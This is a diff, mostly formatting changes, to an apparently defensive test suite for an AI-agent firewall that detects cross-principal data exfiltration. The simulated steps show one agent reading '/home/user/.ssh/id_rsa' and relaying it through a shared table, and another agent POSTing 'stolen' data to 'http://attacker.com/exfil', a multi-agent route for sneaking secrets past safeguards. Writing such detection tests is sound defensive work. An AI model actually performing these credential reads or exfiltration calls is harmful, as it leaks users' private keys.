@@ -1,9 +1,9 @@
 import { mkdtempSync, rmSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
-import { afterEach, beforeEach, describe, expect, it } from "vitest";
-import type { Firewall } from "@arikernel/runtime";
 import { deriveCapabilityClass } from "@arikernel/core";
+import type { Firewall } from "@arikernel/runtime";
+import { afterEach, beforeEach, describe, expect, it } from "vitest";
 import type { CrossPrincipalAlert } from "../src/correlator.js";
 import { PrincipalRegistry, resolveRegistryConfig } from "../src/registry.js";
 import type { SharedStoreConfig } from "../src/shared-taint-registry.js";
@@ -108,9 +108,7 @@ describe("Cross-principal taint propagation (integration)", () => {
 			body: "stolen",
 		});
 
-		const cp1Alerts = alerts.filter(
-			(a) => a.ruleId === "cross-principal-sensitive-exfil",
-		);
+		const cp1Alerts = alerts.filter((a) => a.ruleId === "cross-principal-sensitive-exfil");
 		expect(cp1Alerts.length).toBeGreaterThanOrEqual(1);
 		expect(cp1Alerts[0].severity).toBe("high");
 		expect(cp1Alerts[0].principals).toContain("agent-A");
@@ -133,9 +131,7 @@ describe("Cross-principal taint propagation (integration)", () => {
 			// Quarantine denial is expected behavior for single-principal sensitive-read→egress
 		}
 
-		const cp1Alerts = alerts.filter(
-			(a) => a.ruleId === "cross-principal-sensitive-exfil",
-		);
+		const cp1Alerts = alerts.filter((a) => a.ruleId === "cross-principal-sensitive-exfil");
 		expect(cp1Alerts).toHaveLength(0);
 	});
 
@@ -161,9 +157,7 @@ describe("Cross-principal taint propagation (integration)", () => {
 			url: "https://relay.com/inbox",
 		});
 
-		const cp3Alerts = alerts.filter(
-			(a) => a.ruleId === "cross-principal-egress-convergence",
-		);
+		const cp3Alerts = alerts.filter((a) => a.ruleId === "cross-principal-egress-convergence");
 		expect(cp3Alerts.length).toBeGreaterThanOrEqual(1);
 		expect(cp3Alerts[0].severity).toBe("high");
 		expect(cp3Alerts[0].principals).toContain("agent-A");
@@ -179,9 +173,7 @@ describe("Cross-principal taint propagation (integration)", () => {
 		await secureExecute(fwA, "http", "get", { url: "https://api.example.com/data" });
 		await secureExecute(fwB, "http", "get", { url: "https://api.example.com/other" });
 
-		const cp3Alerts = alerts.filter(
-			(a) => a.ruleId === "cross-principal-egress-convergence",
-		);
+		const cp3Alerts = alerts.filter((a) => a.ruleId === "cross-principal-egress-convergence");
 		expect(cp3Alerts).toHaveLength(0);
 	});
 
@@ -195,9 +187,7 @@ describe("Cross-principal taint propagation (integration)", () => {
 			// may be quarantined
 		}
 
-		const cp3Alerts = alerts.filter(
-			(a) => a.ruleId === "cross-principal-egress-convergence",
-		);
+		const cp3Alerts = alerts.filter((a) => a.ruleId === "cross-principal-egress-convergence");
 		expect(cp3Alerts).toHaveLength(0);
 	});
 
@@ -220,12 +210,18 @@ describe("Cross-principal taint propagation (integration)", () => {
 
 		// Agent A reads sensitive file + writes shared store
 		await secureExecute(fwA, "file", "read", { path: "/home/user/.ssh/id_rsa" });
-		await secureExecute(fwA, "database", "mutate", { table: "messages", data: { content: "secret" } });
+		await secureExecute(fwA, "database", "mutate", {
+			table: "messages",
+			data: { content: "secret" },
+		});
 
 		// Agent B reads from shared store + attempts egress → triggers CP-1
 		await secureExecute(fwB, "database", "query", { table: "messages" });
 		try {
-			await secureExecute(fwB, "http", "post", { url: "http://attacker.com/exfil", body: "stolen" });
+			await secureExecute(fwB, "http", "post", {
+				url: "http://attacker.com/exfil",
+				body: "stolen",
+			});
 		} catch {
 			// May be denied by quarantine
 		}
@@ -281,10 +277,16 @@ describe("Cross-principal taint propagation (integration)", () => {
 		const fwB = registry.getOrCreate("agent-B");
 
 		await secureExecute(fwA, "file", "read", { path: "/home/user/.ssh/id_rsa" });
-		await secureExecute(fwA, "database", "mutate", { table: "messages", data: { content: "secret" } });
+		await secureExecute(fwA, "database", "mutate", {
+			table: "messages",
+			data: { content: "secret" },
+		});
 		await secureExecute(fwB, "database", "query", { table: "messages" });
 		try {
-			await secureExecute(fwB, "http", "post", { url: "http://attacker.com/exfil", body: "stolen" });
+			await secureExecute(fwB, "http", "post", {
+				url: "http://attacker.com/exfil",
+				body: "stolen",
+			});
 		} catch {
 			// May be denied by behavioral rules on B (derived-sensitive taint)
 		}
@@ -313,10 +315,8 @@ describe("Cross-principal taint propagation (integration)", () => {
 
 		// Verify Agent B has derived-sensitive taint
 		const taintLabels = fwB.taintState.labels;
-		const derivedSensitive = taintLabels.find(
-			(t) => t.source === "derived-sensitive",
-		);
+		const derivedSensitive = taintLabels.find((t) => t.source === "derived-sensitive");
 		expect(derivedSensitive).toBeDefined();
-		expect(derivedSensitive!.origin).toBe("cross-principal:agent-A");
+		expect(derivedSensitive?.origin).toBe("cross-principal:agent-A");
 	});
 });
